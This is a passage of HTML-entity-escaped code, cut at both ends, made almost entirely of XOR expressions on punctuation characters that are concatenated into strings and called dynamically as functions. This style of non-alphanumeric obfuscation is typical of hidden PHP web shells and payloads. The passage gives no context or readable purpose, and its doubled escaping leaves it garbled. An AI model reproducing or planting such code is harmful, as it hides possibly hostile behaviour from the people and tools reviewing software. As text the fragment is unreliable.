#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026